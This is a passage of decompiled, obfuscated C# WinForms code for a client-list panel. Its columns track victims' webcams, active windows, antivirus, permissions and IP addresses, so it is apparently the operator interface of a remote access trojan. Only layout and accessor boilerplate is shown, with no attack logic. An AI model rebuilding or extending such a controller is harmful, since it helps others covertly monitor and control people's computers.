    this.vmethod_54().TextAlign = HorizontalAlignment.Center;
    this.vmethod_54().Width = 119;
    this.vmethod_56().DisplayIndex = 7;
    this.vmethod_56().Text = "Idle Time";
    this.vmethod_56().TextAlign = HorizontalAlignment.Center;
    this.vmethod_56().Width = 95;
    this.vmethod_58().Text = "RAM";
    this.vmethod_58().TextAlign = HorizontalAlignment.Center;
    this.vmethod_58().Width = 54;
    this.vmethod_60().Text = "Active Window";
    this.vmethod_60().Width = 149;
    this.vmethod_62().DisplayIndex = 4;
    this.vmethod_62().Text = "Operating System";
    this.vmethod_62().Width = 160;
    this.vmethod_64().DisplayIndex = 9;
    this.vmethod_64().Text = "Client Version";
    this.vmethod_64().TextAlign = HorizontalAlignment.Center;
    this.vmethod_64().Width = (int) sbyte.MaxValue;
    this.vmethod_66().DisplayIndex = 10;
    this.vmethod_66().Text = "IP Address";
    this.vmethod_66().TextAlign = HorizontalAlignment.Center;
    this.vmethod_66().Width = 115;
    this.vmethod_68().DisplayIndex = 11;
    this.vmethod_68().Text = "Webcam";
    this.vmethod_68().Width = 94;
    this.vmethod_70().DisplayIndex = 12;
    this.vmethod_70().Text = "Permissions";
    this.vmethod_70().TextAlign = HorizontalAlignment.Center;
    this.vmethod_70().Width = 106;
    this.vmethod_72().DisplayIndex = 13;
    this.vmethod_72().Text = "Anti-Virus";
    this.vmethod_72().TextAlign = HorizontalAlignment.Center;
    this.vmethod_72().Width = 176;
    this.vmethod_100().DisplayIndex = 14;
    this.vmethod_100().Text = "Install Date";
    this.vmethod_100().Width = 120;
    this.vmethod_134().DisplayIndex = 2;
    this.vmethod_134().Text = "Note";
    this.vmethod_134().Width = 110;
    this.vmethod_78().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_78().AutoSize = true;
    LinkLabel linkLabel1 = this.vmethod_78();
    point1 = new Point(620, 448);
    Point point5 = point1;
    linkLabel1.Location = point5;
    this.vmethod_78().Name = "LinkLabelOffline";
    LinkLabel linkLabel2 = this.vmethod_78();
    size1 = new Size(109, 13);
    Size size50 = size1;
    linkLabel2.Size = size50;
    this.vmethod_78().TabIndex = 5;
    this.vmethod_78().TabStop = true;
    this.vmethod_78().Text = "View Offline Clients";
    this.vmethod_76().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_76().AutoSize = true;
    Label label1 = this.vmethod_76();
    point1 = new Point(2, 446);
    Point point6 = point1;
    label1.Location = point6;
    this.vmethod_76().Name = "LabelClients";
    Label label2 = this.vmethod_76();
    size1 = new Size(113, 13);
    Size size51 = size1;
    label2.Size = size51;
    this.vmethod_76().TabIndex = 4;
    this.vmethod_76().Text = "Connected Clients: 0";
    this.vmethod_74().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_74().Controls.Add((Control) this.vmethod_80());
    this.vmethod_74().Controls.Add((Control) this.vmethod_82());
    TabPage tabPage4 = this.vmethod_74();
    point1 = new Point(0, 0);
    Point point7 = point1;
    tabPage4.Location = point7;
    this.vmethod_74().Name = "TabPage2";
    TabPage tabPage5 = this.vmethod_74();
    padding1 = new Padding(3);
    Padding padding3 = padding1;
    tabPage5.Padding = padding3;
    TabPage tabPage6 = this.vmethod_74();
    size1 = new Size(732, 464);
    Size size52 = size1;
    tabPage6.Size = size52;
    this.vmethod_74().TabIndex = 1;
    this.vmethod_74().Text = "TabPage2";
    this.vmethod_80().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_80().AutoSize = true;
    LinkLabel linkLabel3 = this.vmethod_80();
    point1 = new Point(620, 448);
    Point point8 = point1;
    linkLabel3.Location = point8;
    this.vmethod_80().Name = "LinkLabel1";
    LinkLabel linkLabel4 = this.vmethod_80();
    size1 = new Size(108, 13);
    Size size53 = size1;
    linkLabel4.Size = size53;
    this.vmethod_80().TabIndex = 6;
    this.vmethod_80().TabStop = true;
    this.vmethod_80().Text = "View Online Clients";
    this.vmethod_82().AllowColumnReorder = true;
    this.vmethod_82().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_82().Columns.AddRange(new ColumnHeader[8]
    {
      this.vmethod_112(),
      this.vmethod_114(),
      this.vmethod_116(),
      this.vmethod_118(),
      this.vmethod_120(),
      this.vmethod_122(),
      this.vmethod_124(),
      this.vmethod_126()
    });
    this.vmethod_82().ContextMenuStrip = this.vmethod_102();
    this.vmethod_82().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_82().FullRowSelect = true;
    this.vmethod_82().HideSelection = false;
    GClass41 gclass41_3 = this.vmethod_82();
    point1 = new Point(3, 3);
    Point point9 = point1;
    gclass41_3.Location = point9;
    this.vmethod_82().Name = "AeroListviewOffline";
    this.vmethod_82().OwnerDraw = true;
    GClass41 gclass41_4 = this.vmethod_82();
    size1 = new Size(725, 435);
    Size size54 = size1;
    gclass41_4.Size = size54;
    this.vmethod_82().SmallImageList = this.vmethod_38();
    this.vmethod_82().TabIndex = 4;
    this.vmethod_82().UseCompatibleStateImageBehavior = false;
    this.vmethod_82().View = View.Details;
    this.vmethod_112().Text = "Install Date";
    this.vmethod_112().Width = 110;
    this.vmethod_114().Text = "Location";
    this.vmethod_114().Width = 141;
    this.vmethod_116().Text = "Username";
    this.vmethod_116().TextAlign = HorizontalAlignment.Center;
    this.vmethod_116().Width = 131;
    this.vmethod_118().Text = "Operating System";
    this.vmethod_118().Width = 146;
    this.vmethod_120().Text = "Client Version";
    this.vmethod_120().TextAlign = HorizontalAlignment.Center;
    this.vmethod_120().Width = 143;
    this.vmethod_122().Text = "IP Address";
    this.vmethod_122().TextAlign = HorizontalAlignment.Center;
    this.vmethod_122().Width = 115;
    this.vmethod_124().Text = "Permissions";
    this.vmethod_124().TextAlign = HorizontalAlignment.Center;
    this.vmethod_124().Width = 123;
    this.vmethod_126().Text = "Anti-Virus";
    this.vmethod_126().TextAlign = HorizontalAlignment.Center;
    this.vmethod_126().Width = 158;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(241, 244, 245);
    this.Controls.Add((Control) this.vmethod_44());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlClients);
    size1 = new Size(732, 464);
    this.Size = size1;
    this.vmethod_0().ResumeLayout(false);
    this.vmethod_102().ResumeLayout(false);
    this.vmethod_44().ResumeLayout(false);
    this.vmethod_46().ResumeLayout(false);
    this.vmethod_46().PerformLayout();
    this.vmethod_74().ResumeLayout(false);
    this.vmethod_74().PerformLayout();
    this.ResumeLayout(false);
  }

  internal virtual ContextMenuStrip vmethod_0() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(ContextMenuStrip contextMenuStrip_2) => this.contextMenuStrip_0 = contextMenuStrip_2;

  internal virtual ToolStripSeparator vmethod_2() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_4() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_0 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_6() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_19);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_8() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_23);
    if (this.toolStripMenuItem_2 != null)
      this.toolStripMenuItem_2.Click -= eventHandler;
    this.toolStripMenuItem_2 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_2 == null)
      return;
    this.toolStripMenuItem_2.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_3 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_4 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_14() => this.toolStripMenuItem_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_25);
    if (this.toolStripMenuItem_5 != null)
      this.toolStripMenuItem_5.Click -= eventHandler;
    this.toolStripMenuItem_5 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_5 == null)
      return;
    this.toolStripMenuItem_5.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_16() => this.toolStripMenuItem_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_24);
    if (this.toolStripMenuItem_6 != null)
      this.toolStripMenuItem_6.Click -= eventHandler;
    this.toolStripMenuItem_6 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_6 == null)
      return;
    this.toolStripMenuItem_6.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_18() => this.toolStripMenuItem_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_7 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_20() => this.toolStripMenuItem_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_27);
    if (this.toolStripMenuItem_8 != null)
      this.toolStripMenuItem_8.Click -= eventHandler;
    this.toolStripMenuItem_8 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_8 == null)
      return;
    this.toolStripMenuItem_8.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_22() => this.toolStripMenuItem_9;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_26);
    if (this.toolStripMenuItem_9 != null)
      this.toolStripMenuItem_9.Click -= eventHandler;
    this.toolStripMenuItem_9 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_9 == null)
      return;
    this.toolStripMenuItem_9.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_24() => this.toolStripMenuItem_10;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_28);
    if (this.toolStripMenuItem_10 != null)
      this.toolStripMenuItem_10.Click -= eventHandler;
    this.toolStripMenuItem_10 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_10 == null)
      return;
    this.toolStripMenuItem_10.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_26() => this.toolStripMenuItem_11;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_29);
    if (this.toolStripMenuItem_11 != null)
      this.toolStripMenuItem_11.Click -= eventHandler;
    this.toolStripMenuItem_11 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_11 == null)
      return;
    this.toolStripMenuItem_11.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_28() => this.toolStripMenuItem_12;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_30);
    if (this.toolStripMenuItem_12 != null)
      this.toolStripMenuItem_12.Click -= eventHandler;
    this.toolStripMenuItem_12 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_12 == null)
      return;
    this.toolStripMenuItem_12.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_30() => this.toolStripMenuItem_13;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_31);
    if (this.toolStripMenuItem_13 != null)
      this.toolStripMenuItem_13.Click -= eventHandler;
    this.toolStripMenuItem_13 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_13 == null)
      return;
    this.toolStripMenuItem_13.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_32() => this.toolStripMenuItem_14;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_14 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_34() => this.toolStripMenuItem_15;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_35(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_32);
    if (this.toolStripMenuItem_15 != null)
      this.toolStripMenuItem_15.Click -= eventHandler;
    this.toolStripMenuItem_15 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_15 == null)
      return;
    this.toolStripMenuItem_15.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_36() => this.toolStripMenuItem_16;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_37(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_33);
    if (this.toolStripMenuItem_16 != null)
      this.toolStripMenuItem_16.Click -= eventHandler;
    this.toolStripMenuItem_16 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_16 == null)
      return;
    this.toolStripMenuItem_16.Click += eventHandler;
  }

  internal virtual ImageList vmethod_38() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_39(ImageList imageList_1) => this.imageList_0 = imageList_1;

  internal virtual System.Windows.Forms.Timer vmethod_40() => this.timer_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_41(System.Windows.Forms.Timer timer_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_41);
    if (this.timer_0 != null)
      this.timer_0.Tick -= eventHandler;
    this.timer_0 = timer_3;
    if (this.timer_0 == null)
      return;
    this.timer_0.Tick += eventHandler;
  }

  internal virtual System.Windows.Forms.Timer vmethod_42() => this.timer_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_43(System.Windows.Forms.Timer timer_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_42);
    if (this.timer_1 != null)
      this.timer_1.Tick -= eventHandler;
    this.timer_1 = timer_3;
    if (this.timer_1 == null)
      return;
    this.timer_1.Tick += eventHandler;
  }

  internal virtual GControl6 vmethod_44() => this.gcontrol6_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_45(GControl6 gcontrol6_1) => this.gcontrol6_0 = gcontrol6_1;

  internal virtual TabPage vmethod_46() => this.tabPage_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_47(TabPage tabPage_2) => this.tabPage_0 = tabPage_2;

  internal virtual ColumnHeader vmethod_48() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_49(ColumnHeader columnHeader_32) => this.columnHeader_0 = columnHeader_32;

  internal virtual ColumnHeader vmethod_50() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_51(ColumnHeader columnHeader_32) => this.columnHeader_1 = columnHeader_32;

  internal virtual ColumnHeader vmethod_52() => this.columnHeader_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_53(ColumnHeader columnHeader_32) => this.columnHeader_2 = columnHeader_32;

  internal virtual ColumnHeader vmethod_54() => this.columnHeader_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_55(ColumnHeader columnHeader_32) => this.columnHeader_3 = columnHeader_32;

  internal virtual ColumnHeader vmethod_56() => this.columnHeader_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_57(ColumnHeader columnHeader_32) => this.columnHeader_4 = columnHeader_32;

  internal virtual ColumnHeader vmethod_58() => this.columnHeader_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_59(ColumnHeader columnHeader_32) => this.columnHeader_5 = columnHeader_32;

  internal virtual ColumnHeader vmethod_60() => this.columnHeader_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_61(ColumnHeader columnHeader_32) => this.columnHeader_6 = columnHeader_32;

  internal virtual ColumnHeader vmethod_62() => this.columnHeader_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_63(ColumnHeader columnHeader_32) => this.columnHeader_7 = columnHeader_32;

  internal virtual ColumnHeader vmethod_64() => this.columnHeader_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_65(ColumnHeader columnHeader_32) => this.columnHeader_8 = columnHeader_32;

  internal virtual ColumnHeader vmethod_66() => this.columnHeader_9;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_67(ColumnHeader columnHeader_32) => this.columnHeader_9 = columnHeader_32;

  internal virtual ColumnHeader vmethod_68() => this.columnHeader_10;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_69(ColumnHeader columnHeader_32) => this.columnHeader_10 = columnHeader_32;

  internal virtual ColumnHeader vmethod_70() => this.columnHeader_11;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_71(ColumnHeader columnHeader_32) => this.columnHeader_11 = columnHeader_32;

  internal virtual ColumnHeader vmethod_72() => this.columnHeader_12;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_73(ColumnHeader columnHeader_32) => this.columnHeader_12 = columnHeader_32;

  internal virtual TabPage vmethod_74() => this.tabPage_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_75(TabPage tabPage_2) => this.tabPage_1 = tabPage_2;

  internal virtual Label vmethod_76() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_77(Label label_1) => this.label_0 = label_1;

  internal virtual LinkLabel vmethod_78() => this.linkLabel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_79(LinkLabel linkLabel_2)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_55);
    if (this.linkLabel_0 != null)
      this.linkLabel_0.LinkClicked -= clickedEventHandler;
    this.linkLabel_0 = linkLabel_2;
    if (this.linkLabel_0 == null)
      return;
    this.linkLabel_0.LinkClicked += clickedEventHandler;
  }

  internal virtual LinkLabel vmethod_80() => this.linkLabel_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_81(LinkLabel linkLabel_2)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_56);
    if (this.linkLabel_1 != null)
      this.linkLabel_1.LinkClicked -= clickedEventHandler;
    this.linkLabel_1 = linkLabel_2;
    if (this.linkLabel_1 == null)
      return;
    this.linkLabel_1.LinkClicked += clickedEventHandler;
  }

  internal virtual GClass41 vmethod_82() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_83(GClass41 gclass41_2) => this.gclass41_0 = gclass41_2;

  internal virtual ColumnHeader vmethod_84() => this.columnHeader_13;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_85(ColumnHeader columnHeader_32) => this.columnHeader_13 = columnHeader_32;

  internal virtual ColumnHeader vmethod_86() => this.columnHeader_14;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_87(ColumnHeader columnHeader_32) => this.columnHeader_14 = columnHeader_32;

  internal virtual ColumnHeader vmethod_88() => this.columnHeader_15;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_89(ColumnHeader columnHeader_32) => this.columnHeader_15 = columnHeader_32;

  internal virtual ColumnHeader vmethod_90() => this.columnHeader_16;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_91(ColumnHeader columnHeader_32) => this.columnHeader_16 = columnHeader_32;

  internal virtual ColumnHeader vmethod_92() => this.columnHeader_17;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_93(ColumnHeader columnHeader_32) => this.columnHeader_17 = columnHeader_32;

  internal virtual ColumnHeader vmethod_94() => this.columnHeader_18;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_95(ColumnHeader columnHeader_32) => this.columnHeader_18 = columnHeader_32;

  internal virtual ColumnHeader vmethod_96() => this.columnHeader_19;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_97(ColumnHeader columnHeader_32) => this.columnHeader_19 = columnHeader_32;

  internal virtual ColumnHeader vmethod_98() => this.columnHeader_20;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_99(ColumnHeader columnHeader_32) => this.columnHeader_20 = columnHeader_32;

  internal virtual ColumnHeader vmethod_100() => this.columnHeader_21;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_101(ColumnHeader columnHeader_32) => this.columnHeader_21 = columnHeader_32;

  internal virtual ContextMenuStrip vmethod_102() => this.contextMenuStrip_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_103(ContextMenuStrip contextMenuStrip_2) => this.contextMenuStrip_1 = contextMenuStrip_2;

  internal virtual ToolStripMenuItem vmethod_104() => this.toolStripMenuItem_17;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_105(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_59);
    if (this.toolStripMenuItem_17 != null)
      this.toolStripMenuItem_17.Click -= eventHandler;
    this.toolStripMenuItem_17 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_17 == null)
      return;
    this.toolStripMenuItem_17.Click += eventHandler;
  }

  internal virtual System.Windows.Forms.Timer vmethod_106() => this.timer_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_107(System.Windows.Forms.Timer timer_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_60);
    if (this.timer_2 != null)
      this.timer_2.Tick -= eventHandler;
    this.timer_2 = timer_3;
    if (this.timer_2 == null)
      return;
    this.timer_2.Tick += eventHandler;
  }

  internal virtual GClass41 vmethod_108() => this.gclass41_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_109(GClass41 gclass41_2) => this.gclass41_1 = gclass41_2;

  internal virtual ColumnHeader vmethod_110() => this.columnHeader_22;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_111(ColumnHeader columnHeader_32) => this.columnHeader_22 = columnHeader_32;

  internal virtual ColumnHeader vmethod_112() => this.columnHeader_23;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_113(ColumnHeader columnHeader_32) => this.columnHeader_23 = columnHeader_32;

  internal virtual ColumnHeader vmethod_114() => this.columnHeader_24;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_115(ColumnHeader columnHeader_32) => this.columnHeader_24 = columnHeader_32;

  internal virtual ColumnHeader vmethod_116() => this.columnHeader_25;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_117(ColumnHeader columnHeader_32) => this.columnHeader_25 = columnHeader_32;

  internal virtual ColumnHeader vmethod_118() => this.columnHeader_26;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_119(ColumnHeader columnHeader_32) => this.columnHeader_26 = columnHeader_32;

  internal virtual ColumnHeader vmethod_120() => this.columnHeader_27;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_121(ColumnHeader columnHeader_32) => this.columnHeader_27 = columnHeader_32;

  internal virtual ColumnHeader vmethod_122() => this.columnHeader_28;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_123(ColumnHeader columnHeader_32) => this.columnHeader_28 = columnHeader_32;

  internal virtual ColumnHeader vmethod_124() => this.columnHeader_29;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_125(ColumnHeader columnHeader_32) => this.columnHeader_29 = columnHeader_32;

  internal virtual ColumnHeader vmethod_126() => this.columnHeader_30;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_127(ColumnHeader columnHeader_32) => this.columnHeader_30 = columnHeader_32;

  internal virtual ToolStripMenuItem vmethod_128() => this.toolStripMenuItem_18;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_129(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_62);
    if (this.toolStripMenuItem_18 != null)
      this.toolStripMenuItem_18.Click -= eventHandler;
    this.toolStripMenuItem_18 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_18 == null)
      return;
    this.toolStripMenuItem_18.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_130() => this.toolStripMenuItem_19;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_131(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_36);
    if (this.toolStripMenuItem_19 != null)
      this.toolStripMenuItem_19.Click -= eventHandler;
    this.toolStripMenuItem_19 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_19 == null)
      return;
    this.toolStripMenuItem_19.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_132() => this.toolStripMenuItem_20;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_133(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_63);
    if (this.toolStripMenuItem_20 != null)
      this.toolStripMenuItem_20.Click -= eventHandler;
    this.toolStripMenuItem_20 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_20 == null)
      return;
    this.toolStripMenuItem_20.Click += eventHandler;
  }

  internal virtual ColumnHeader vmethod_134() => this.columnHeader_31;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_135(ColumnHeader columnHeader_32) => this.columnHeader_31 = columnHeader_32;

  internal virtual ToolStripMenuItem vmethod_136() => this.toolStripMenuItem_21;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_137(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_64);
    if (this.toolStripMenuItem_21 != null)
      this.toolStripMenuItem_21.Click -= eventHandler;
    this.toolStripMenuItem_21 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_21 == null)
      return;
    this.toolStripMenuItem_21.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_138() => this.toolStripMenuItem_22;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_139(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_18);
    if (this.toolStripMenuItem_22 != null)
      this.toolStripMenuItem_22.Click -= eventHandler;
    this.toolStripMenuItem_22 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_22 == null)
      return;
    this.toolStripMenuItem_22.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_140() => this.toolStripMenuItem_23;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_141(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_17);
    if (this.toolStripMenuItem_23 != null)
      this.toolStripMenuItem_23.Click -= eventHandler;
    this.toolStripMenuItem_23 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_23 == null)
      return;
    this.toolStripMenuItem_23.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_142() => this.toolStripMenuItem_24;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_143(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_39);
    if (this.toolStripMenuItem_24 != null)
      this.toolStripMenuItem_24.Click -= eventHandler;
    this.toolStripMenuItem_24 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_24 == null)
      return;
    this.toolStripMenuItem_24.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_144() => this.toolStripMenuItem_25;

  [MethodImpl(MethodImplOptions.Synchronized)]
